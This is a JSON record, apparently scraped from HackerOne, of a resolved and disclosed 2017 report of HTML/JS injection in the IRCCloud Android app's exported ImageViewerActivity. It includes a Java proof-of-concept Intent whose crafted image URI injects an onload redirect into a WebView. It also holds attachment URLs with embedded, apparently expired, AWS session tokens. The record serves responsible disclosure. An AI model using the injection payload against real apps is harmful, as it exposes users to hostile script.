@@ -1,0 +1,355 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2017-10-26T17:14:48.752Z", 
+    "voters": [
+        "secator", 
+        "eveeez", 
+        "michael1026", 
+        "vraj", 
+        "sup3r-b0y", 
+        "b3nac", 
+        "craxerbikash", 
+        "null-byte", 
+        "japz", 
+        "smit", 
+        "and 6 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "500.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 283063, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2017-11-03T11:36:13.852Z", 
+    "vulnerability_information": "Hi, I'd like to report HTML/JS injection in activity ```com.irccloud.android.activity.ImageViewerActivity``` which is exported:\n```xml\n        <activity android:configChanges=\"keyboardHidden|orientation|screenSize\" android:label=\"@string/title_activity_imageviewer\" android:name=\"com.irccloud.android.activity.ImageViewerActivity\" android:theme=\"@style/ImageViewerTheme\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.VIEW\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n                <category android:name=\"android.intent.category.BROWSABLE\"/>\n                <data android:scheme=\"@string/IMAGE_SCHEME\"/>\n            </intent-filter>\n            <intent-filter>\n                <action android:name=\"android.intent.action.VIEW\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n                <category android:name=\"android.intent.category.BROWSABLE\"/>\n                <data android:scheme=\"@string/IMAGE_SCHEME_SECURE\"/>\n            </intent-filter>\n        </activity>\n```\nso can be launched by arbitrary apps installed on the same device. On the newest Androids could be exploited also by Android Instant Apps directly from a web-browser (installation is not required).\n\nFile ``` com/irccloud/android/activity/ImageViewerActivity.java  ```\n```java\n\n        } else if (getIntent() == null || getIntent().getDataString() == null) {\n            finish();\n        } else {\n            ImageList.getInstance().fetchImageInfo(getIntent().getDataString().replace(getResources().getString(R.string.IMAGE_SCHEME), \"http\"), new OnImageInfoListener() {\n                public void onImageInfo(ImageURLInfo info) {\n                    if (info == null) {\n                        ImageViewerActivity.this.fail();\n                    } else if (info.mp4 != null) {\n                        ImageViewerActivity.this.loadVideo(info.mp4);\n                    } else {\n                        ImageViewerActivity.this.loadImage(info.thumbnail); // by default\n                    }\n                }\n            });\n        }\n```\n\nHere we see that method ```ImageList.fetchImageInfo(..)``` is being loaded with attacker provided data.\nInside ``` ImageList ```:\n```java\n    public void fetchImageInfo(String URL, OnImageInfoListener listener) {\n        // ...\n        String url = URL;\n        // ...\n        ImageURLInfo info = new ImageURLInfo();\n        info.thumbnail = url;\n        info.original_url = URL;\n        putImageInfo(info);\n        listener.onImageInfo(info);\n```\nSo both ```info.thumbnail``` and ```info.original_url``` contains attacker provided data and this stuff is returned back to ```ImageViewerActivity``` where code is executed\n```java\nImageViewerActivity.this.loadImage(info.thumbnail);\n```\n\nInside this method attacker can inject arbitrary HTML/JS:\n```java\nprivate void loadImage(String urlStr) {\n        try {\n            // ...\n            this.mImage.loadDataWithBaseURL(null, \"<!DOCTYPE html>\\n<html><head><style>html, body, table { height: 100%; width: 100%; background-color: #000;}</style></head>\\n<body>\\n<table><tr><td><img src='\" + new URL(urlStr).toString() + \"' width='100%' onerror='Android.imageFailed()' onclick='Android.imageClicked()' style='background-color: #fff;'/>\\n</td></tr></table></body>\\n</html>\", \"text/html\", \"UTF-8\", null);\n```\n\nPoC of exploitation on Java:\n```java\n        Intent intent = new Intent();\n        intent.setClassName(\"com.irccloud.android\", \"com.irccloud.android.activity.ImageViewerActivity\");\n        intent.setData(Uri.parse(\"https://shoppersocial.me/wp-content/uploads/2016/06/wow.jpg' onload='window.location.href=\\\"http://yahoo.com\\\"\"));\n        startActivity(intent);\n```\n\nResult:\n{F233010}\n{F233011}\n\nAPK is attached", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "medium", 
+        "author_type": "User"
+    }, 
+    "title": "[IRCCloud Android] XSS in ImageViewerActivity", 
+    "is_member_of_team?": null, 
+    "vote_count": 16, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "com.irccloud.android", 
+        "max_severity": "critical", 
+        "databaseId": 271, 
+        "asset_type": "GOOGLE_PLAY_APP_ID"
+    }, 
+    "allow_singular_disclosure_at": "2017-11-25T17:14:48.792Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$500", 
+    "attachments": [
+        {
+            "file_name": "2017-10-26_15-15-58.jpg", 
+            "type": "image/jpeg", 
+            "id": 233010, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/233/010/6f259ee38d609477cfc958a9dbd9b2ddbe712b32/2017-10-26_15-15-58.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVYUZEEBI%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223026Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDMO36pSTeUTC%2FSulZyK3A%2F5%2B%2FTOIgP6UP6H0wSySVBbyL4FQzfP8bav04ajjwBBaxmOhkHA2wujzRb5TbhMhSerMFHQMs%2BlaWPr9zHOl9bbpq8AObWm7%2BuYiH%2BdA7DVleq4N%2BRlVWG6ukszpeguapBWm%2BeaJz0G%2BtsAf0URs%2FZMn4gmiEGoILlZfH0Rxga04TPWKr%2BmJq3DgVJVO8RtbrjLs0%2BhbTb5D6fQvXvZFqnYE5Cq1E4wzEU6Z0Vk16WfzancxdjY7xdYjXkaE4By4xpRprbRaCsQPyDiBmTv0e4fZZUzHn9AjPRxIaswdwrcjaXpaPttjxFnmTigGxFQd%2FIk%2BnLBRveHtHrDZMcPESe9UFT8iakt2ZZLVeHA2xYnKx1ntoUshuUm75iMCEVRsFrVOfDopKYAuhSUTkGAp4XOliz2GytEQUQkeqhliO5VdioSueZvZadU9HHNOh5%2B90tBDDLxOK4Kh1FDQaJDMx84K%2FsBLvwqLH2hzqyXyNTjWFchQyXDNcu04rcBuH9%2BWWM9YV2K9gLNj%2BPuUU2uBat%2FkH9T3MGSQLTZehkqVxj%2BKPShN9%2Bsy39j%2FW%2BarOzYC1kRM0e%2F%2FsEso25Km4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=12ffeaedf688315e40f5cb2b3b2e1c31465a0202ea6b8aa600e81b04a3b913b1"
+        }, 
+        {
+            "file_name": "2017-10-26_15-15-26.jpg", 
+            "type": "image/jpeg", 
+            "id": 233011, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/233/011/146432005717c4cb5a03428bd861945404c89327/2017-10-26_15-15-26.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVYUZEEBI%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223026Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDMO36pSTeUTC%2FSulZyK3A%2F5%2B%2FTOIgP6UP6H0wSySVBbyL4FQzfP8bav04ajjwBBaxmOhkHA2wujzRb5TbhMhSerMFHQMs%2BlaWPr9zHOl9bbpq8AObWm7%2BuYiH%2BdA7DVleq4N%2BRlVWG6ukszpeguapBWm%2BeaJz0G%2BtsAf0URs%2FZMn4gmiEGoILlZfH0Rxga04TPWKr%2BmJq3DgVJVO8RtbrjLs0%2BhbTb5D6fQvXvZFqnYE5Cq1E4wzEU6Z0Vk16WfzancxdjY7xdYjXkaE4By4xpRprbRaCsQPyDiBmTv0e4fZZUzHn9AjPRxIaswdwrcjaXpaPttjxFnmTigGxFQd%2FIk%2BnLBRveHtHrDZMcPESe9UFT8iakt2ZZLVeHA2xYnKx1ntoUshuUm75iMCEVRsFrVOfDopKYAuhSUTkGAp4XOliz2GytEQUQkeqhliO5VdioSueZvZadU9HHNOh5%2B90tBDDLxOK4Kh1FDQaJDMx84K%2FsBLvwqLH2hzqyXyNTjWFchQyXDNcu04rcBuH9%2BWWM9YV2K9gLNj%2BPuUU2uBat%2FkH9T3MGSQLTZehkqVxj%2BKPShN9%2Bsy39j%2FW%2BarOzYC1kRM0e%2F%2FsEso25Km4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a6008e412b5141cc2e782629c103ea043c9f330a588a0232e1e22e638757f803"
+        }, 
+        {
+            "file_name": "app-release.apk", 
+            "type": "application/zip", 
+            "id": 233012, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/233/012/13b98903aec19680eb7ea94d784dcc3c4b7859cb/app-release.apk?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVYUZEEBI%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223026Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDMO36pSTeUTC%2FSulZyK3A%2F5%2B%2FTOIgP6UP6H0wSySVBbyL4FQzfP8bav04ajjwBBaxmOhkHA2wujzRb5TbhMhSerMFHQMs%2BlaWPr9zHOl9bbpq8AObWm7%2BuYiH%2BdA7DVleq4N%2BRlVWG6ukszpeguapBWm%2BeaJz0G%2BtsAf0URs%2FZMn4gmiEGoILlZfH0Rxga04TPWKr%2BmJq3DgVJVO8RtbrjLs0%2BhbTb5D6fQvXvZFqnYE5Cq1E4wzEU6Z0Vk16WfzancxdjY7xdYjXkaE4By4xpRprbRaCsQPyDiBmTv0e4fZZUzHn9AjPRxIaswdwrcjaXpaPttjxFnmTigGxFQd%2FIk%2BnLBRveHtHrDZMcPESe9UFT8iakt2ZZLVeHA2xYnKx1ntoUshuUm75iMCEVRsFrVOfDopKYAuhSUTkGAp4XOliz2GytEQUQkeqhliO5VdioSueZvZadU9HHNOh5%2B90tBDDLxOK4Kh1FDQaJDMx84K%2FsBLvwqLH2hzqyXyNTjWFchQyXDNcu04rcBuH9%2BWWM9YV2K9gLNj%2BPuUU2uBat%2FkH9T3MGSQLTZehkqVxj%2BKPShN9%2Bsy39j%2FW%2BarOzYC1kRM0e%2F%2FsEso25Km4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=697639e04d8a4c3b036be4dbb7c1e9c2d31b5e840938501092944bddd29af16a"
+        }
+    ], 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "bagipro", 
+                "url": "/bagipro"
+            }, 
+            "created_at": "2017-10-26T15:23:50.494Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-26T15:23:50.494Z", 
+            "actor": {
+                "username": "jwheare", 
+                "url": "/jwheare", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/778/a4ee72f52ef5430dc7e3ce3939e385d26312356d_medium.jpeg?1397052045"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "irccloud", 
+            "message": "Thanks for this report. We've prevented this view from being exported and will be adding further escaping to protect against injection attacks.\nhttps://github.com/irccloud/android/commit/8ff145519bcd30da1898dd54a68629f53c62afe7", 
+            "markdown_message": "<p>Thanks for this report. We&#39;ve prevented this view from being exported and will be adding further escaping to protect against injection attacks.<br>\n<a title=\"https://github.com/irccloud/android/commit/8ff145519bcd30da1898dd54a68629f53c62afe7\" href=\"/redirect?signature=b8c3a82806f53fe742c535f2f68b40859901ec54&amp;url=https%3A%2F%2Fgithub.com%2Firccloud%2Fandroid%2Fcommit%2F8ff145519bcd30da1898dd54a68629f53c62afe7\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/irccloud/android/commit/8ff145519bcd30da1898dd54a68629f53c62afe7</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 2105581, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-10-26T15:24:07.234Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-26T15:24:07.234Z", 
+            "actor": {
+                "url": "/irccloud", 
+                "profile": {
+                    "name": "IRCCloud"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/140/5cf4f659a47ba7cb2c48a391465795c07e2ae926_medium.png?1397053347"
+                }
+            }, 
+            "team_handle": "irccloud", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "150.0", 
+            "collaborator": {
+                "username": "bagipro", 
+                "url": "/bagipro"
+            }, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BountyAwarded", 
+            "id": 2105583, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-10-26T15:25:08.537Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-26T15:25:08.537Z", 
+            "actor": {
+                "url": "/irccloud", 
+                "profile": {
+                    "name": "IRCCloud"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/140/5cf4f659a47ba7cb2c48a391465795c07e2ae926_medium.png?1397053347"
+                }
+            }, 
+            "team_handle": "irccloud", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "350.0", 
+            "collaborator": {
+                "username": "bagipro", 
+                "url": "/bagipro"
+            }, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BountyAwarded", 
+            "id": 2105587, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-10-26T17:14:39.268Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-26T17:14:39.268Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "irccloud", 
+            "message": "Cool, thanks. Can we disclose?", 
+            "markdown_message": "<p>Cool, thanks. Can we disclose?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2105878, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-10-26T17:14:48.771Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-26T17:14:48.771Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "irccloud", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2105879, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-02T18:36:50.513Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-02T18:37:19.344Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "irccloud", 
+            "message": "@jwheare Hi. Could you please agree to disclose it? I've found the same issue, and I need to give a reference", 
+            "markdown_message": "<p><a href=\"/jwheare\">@jwheare</a> Hi. Could you please agree to disclose it? I&#39;ve found the same issue, and I need to give a reference</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2128849, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-03T11:36:13.883Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-03T11:36:13.883Z", 
+            "actor": {
+                "username": "jwheare", 
+                "url": "/jwheare", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/778/a4ee72f52ef5430dc7e3ce3939e385d26312356d_medium.jpeg?1397052045"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "irccloud", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2131169, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-03T11:36:14.013Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-03T11:36:14.013Z", 
+            "actor": {
+                "username": "jwheare", 
+                "url": "/jwheare", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/778/a4ee72f52ef5430dc7e3ce3939e385d26312356d_medium.jpeg?1397052045"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "irccloud", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 2131170, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "bagipro", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/bagipro", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/052/239/4da99970bfc1e4897f003883d05dc8acfec556ef_small.jpg?1510530490"
+        }, 
+        "is_me?": false
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -32505337.429384593, 
+    "disclosed_at": "2017-11-03T11:36:13.948Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/283063", 
+    "created_at": "2017-10-26T12:18:33.011Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>Hi, I&#39;d like to report HTML/JS injection in activity <code>com.irccloud.android.activity.ImageViewerActivity</code> which is exported:</p>\n<pre class=\"highlight xml\"><code>        <span class=\"nt\">&lt;activity</span> <span class=\"na\">android:configChanges=</span><span class=\"s\">&quot;keyboardHidden|orientation|screenSize&quot;</span> <span class=\"na\">android:label=</span><span class=\"s\">&quot;@string/title_activity_imageviewer&quot;</span> <span class=\"na\">android:name=</span><span class=\"s\">&quot;com.irccloud.android.activity.ImageViewerActivity&quot;</span> <span class=\"na\">android:theme=</span><span class=\"s\">&quot;@style/ImageViewerTheme&quot;</span><span class=\"nt\">&gt;</span>\n            <span class=\"nt\">&lt;intent-filter&gt;</span>\n                <span class=\"nt\">&lt;action</span> <span class=\"na\">android:name=</span><span class=\"s\">&quot;android.intent.action.VIEW&quot;</span><span class=\"nt\">/&gt;</span>\n                <span class=\"nt\">&lt;category</span> <span class=\"na\">android:name=</span><span class=\"s\">&quot;android.intent.category.DEFAULT&quot;</span><span class=\"nt\">/&gt;</span>\n                <span class=\"nt\">&lt;category</span> <span class=\"na\">android:name=</span><span class=\"s\">&quot;android.intent.category.BROWSABLE&quot;</span><span class=\"nt\">/&gt;</span>\n                <span class=\"nt\">&lt;data</span> <span class=\"na\">android:scheme=</span><span class=\"s\">&quot;@string/IMAGE_SCHEME&quot;</span><span class=\"nt\">/&gt;</span>\n            <span class=\"nt\">&lt;/intent-filter&gt;</span>\n            <span class=\"nt\">&lt;intent-filter&gt;</span>\n                <span class=\"nt\">&lt;action</span> <span class=\"na\">android:name=</span><span class=\"s\">&quot;android.intent.action.VIEW&quot;</span><span class=\"nt\">/&gt;</span>\n                <span class=\"nt\">&lt;category</span> <span class=\"na\">android:name=</span><span class=\"s\">&quot;android.intent.category.DEFAULT&quot;</span><span class=\"nt\">/&gt;</span>\n                <span class=\"nt\">&lt;category</span> <span class=\"na\">android:name=</span><span class=\"s\">&quot;android.intent.category.BROWSABLE&quot;</span><span class=\"nt\">/&gt;</span>\n                <span class=\"nt\">&lt;data</span> <span class=\"na\">android:scheme=</span><span class=\"s\">&quot;@string/IMAGE_SCHEME_SECURE&quot;</span><span class=\"nt\">/&gt;</span>\n            <span class=\"nt\">&lt;/intent-filter&gt;</span>\n        <span class=\"nt\">&lt;/activity&gt;</span>\n</code></pre>\n<p>so can be launched by arbitrary apps installed on the same device. On the newest Androids could be exploited also by Android Instant Apps directly from a web-browser (installation is not required).</p>\n\n<p>File <code>com/irccloud/android/activity/ImageViewerActivity.java</code></p>\n<pre class=\"highlight java\"><code>\n        <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">getIntent</span><span class=\"o\">()</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"n\">getIntent</span><span class=\"o\">().</span><span class=\"na\">getDataString</span><span class=\"o\">()</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">finish</span><span class=\"o\">();</span>\n        <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>\n            <span class=\"n\">ImageList</span><span class=\"o\">.</span><span class=\"na\">getInstance</span><span class=\"o\">().</span><span class=\"na\">fetchImageInfo</span><span class=\"o\">(</span><span class=\"n\">getIntent</span><span class=\"o\">().</span><span class=\"na\">getDataString</span><span class=\"o\">().</span><span class=\"na\">replace</span><span class=\"o\">(</span><span class=\"n\">getResources</span><span class=\"o\">().</span><span class=\"na\">getString</span><span class=\"o\">(</span><span class=\"n\">R</span><span class=\"o\">.</span><span class=\"na\">string</span><span class=\"o\">.</span><span class=\"na\">IMAGE_SCHEME</span><span class=\"o\">),</span> <span class=\"s\">&quot;http&quot;</span><span class=\"o\">),</span> <span class=\"k\">new</span> <span class=\"n\">OnImageInfoListener</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n                <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">onImageInfo</span><span class=\"o\">(</span><span class=\"n\">ImageURLInfo</span> <span class=\"n\">info</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">info</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                        <span class=\"n\">ImageViewerActivity</span><span class=\"o\">.</span><span class=\"na\">this</span><span class=\"o\">.</span><span class=\"na\">fail</span><span class=\"o\">();</span>\n                    <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">info</span><span class=\"o\">.</span><span class=\"na\">mp4</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                        <span class=\"n\">ImageViewerActivity</span><span class=\"o\">.</span><span class=\"na\">this</span><span class=\"o\">.</span><span class=\"na\">loadVideo</span><span class=\"o\">(</span><span class=\"n\">info</span><span class=\"o\">.</span><span class=\"na\">mp4</span><span class=\"o\">);</span>\n                    <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>\n                        <span class=\"n\">ImageViewerActivity</span><span class=\"o\">.</span><span class=\"na\">this</span><span class=\"o\">.</span><span class=\"na\">loadImage</span><span class=\"o\">(</span><span class=\"n\">info</span><span class=\"o\">.</span><span class=\"na\">thumbnail</span><span class=\"o\">);</span> <span class=\"c1\">// by default</span>\n                    <span class=\"o\">}</span>\n                <span class=\"o\">}</span>\n            <span class=\"o\">});</span>\n        <span class=\"o\">}</span>\n</code></pre>\n<p>Here we see that method <code>ImageList.fetchImageInfo(..)</code> is being loaded with attacker provided data.<br>\nInside <code>ImageList</code>:</p>\n<pre class=\"highlight java\"><code>    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">fetchImageInfo</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">URL</span><span class=\"o\">,</span> <span class=\"n\">OnImageInfoListener</span> <span class=\"n\">listener</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"c1\">// ...</span>\n        <span class=\"n\">String</span> <span class=\"n\">url</span> <span class=\"o\">=</span> <span class=\"n\">URL</span><span class=\"o\">;</span>\n        <span class=\"c1\">// ...</span>\n        <span class=\"n\">ImageURLInfo</span> <span class=\"n\">info</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ImageURLInfo</span><span class=\"o\">();</span>\n        <span class=\"n\">info</span><span class=\"o\">.</span><span class=\"na\">thumbnail</span> <span class=\"o\">=</span> <span class=\"n\">url</span><span class=\"o\">;</span>\n        <span class=\"n\">info</span><span class=\"o\">.</span><span class=\"na\">original_url</span> <span class=\"o\">=</span> <span class=\"n\">URL</span><span class=\"o\">;</span>\n        <span class=\"n\">putImageInfo</span><span class=\"o\">(</span><span class=\"n\">info</span><span class=\"o\">);</span>\n        <span class=\"n\">listener</span><span class=\"o\">.</span><span class=\"na\">onImageInfo</span><span class=\"o\">(</span><span class=\"n\">info</span><span class=\"o\">);</span>\n</code></pre>\n<p>So both <code>info.thumbnail</code> and <code>info.original_url</code> contains attacker provided data and this stuff is returned back to <code>ImageViewerActivity</code> where code is executed</p>\n<pre class=\"highlight java\"><code><span class=\"n\">ImageViewerActivity</span><span class=\"o\">.</span><span class=\"na\">this</span><span class=\"o\">.</span><span class=\"na\">loadImage</span><span class=\"o\">(</span><span class=\"n\">info</span><span class=\"o\">.</span><span class=\"na\">thumbnail</span><span class=\"o\">);</span>\n</code></pre>\n<p>Inside this method attacker can inject arbitrary HTML/JS:</p>\n<pre class=\"highlight java\"><code><span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">loadImage</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">urlStr</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">try</span> <span class=\"o\">{</span>\n            <span class=\"c1\">// ...</span>\n            <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">mImage</span><span class=\"o\">.</span><span class=\"na\">loadDataWithBaseURL</span><span class=\"o\">(</span><span class=\"kc\">null</span><span class=\"o\">,</span> <span class=\"s\">&quot;&lt;!DOCTYPE html&gt;\\n&lt;html&gt;&lt;head&gt;&lt;style&gt;html, body, table { height: 100%; width: 100%; background-color: #000;}&lt;/style&gt;&lt;/head&gt;\\n&lt;body&gt;\\n&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;img src=&#39;&quot;</span> <span class=\"o\">+</span> <span class=\"k\">new</span> <span class=\"n\">URL</span><span class=\"o\">(</span><span class=\"n\">urlStr</span><span class=\"o\">).</span><span class=\"na\">toString</span><span class=\"o\">()</span> <span class=\"o\">+</span> <span class=\"s\">&quot;&#39; width=&#39;100%&#39; onerror=&#39;Android.imageFailed()&#39; onclick=&#39;Android.imageClicked()&#39; style=&#39;background-color: #fff;&#39;/&gt;\\n&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/body&gt;\\n&lt;/html&gt;&quot;</span><span class=\"o\">,</span> <span class=\"s\">&quot;text/html&quot;</span><span class=\"o\">,</span> <span class=\"s\">&quot;UTF-8&quot;</span><span class=\"o\">,</span> <span class=\"kc\">null</span><span class=\"o\">);</span>\n</code></pre>\n<p>PoC of exploitation on Java:</p>\n<pre class=\"highlight java\"><code>        <span class=\"n\">Intent</span> <span class=\"n\">intent</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Intent</span><span class=\"o\">();</span>\n        <span class=\"n\">intent</span><span class=\"o\">.</span><span class=\"na\">setClassName</span><span class=\"o\">(</span><span class=\"s\">&quot;com.irccloud.android&quot;</span><span class=\"o\">,</span> <span class=\"s\">&quot;com.irccloud.android.activity.ImageViewerActivity&quot;</span><span class=\"o\">);</span>\n        <span class=\"n\">intent</span><span class=\"o\">.</span><span class=\"na\">setData</span><span class=\"o\">(</span><span class=\"n\">Uri</span><span class=\"o\">.</span><span class=\"na\">parse</span><span class=\"o\">(</span><span class=\"s\">&quot;https://shoppersocial.me/wp-content/uploads/2016/06/wow.jpg&#39; 